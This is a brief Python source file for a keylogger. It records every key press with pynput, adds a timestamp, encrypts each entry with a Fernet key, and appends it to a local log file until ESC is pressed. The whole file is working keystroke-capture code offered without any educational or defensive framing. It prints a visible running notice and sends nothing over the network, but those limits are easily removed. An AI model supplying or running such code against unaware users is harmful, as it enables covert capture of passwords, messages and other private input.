from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime

# Load the encryption key
with open("key.key", "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)

log_file = "keylog.enc"

def encrypt_and_write(log_entry):
    encrypted_entry = fernet.encrypt(log_entry.encode())
    with open(log_file, "ab") as f:
        f.write(encrypted_entry + b"\n")

def on_press(key):
    try:
        key_str = str(key.char)
    except AttributeError:
        key_str = f" [{key}] "

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp} - {key_str}"
    encrypt_and_write(log_entry)

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

print("Keylogger running. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
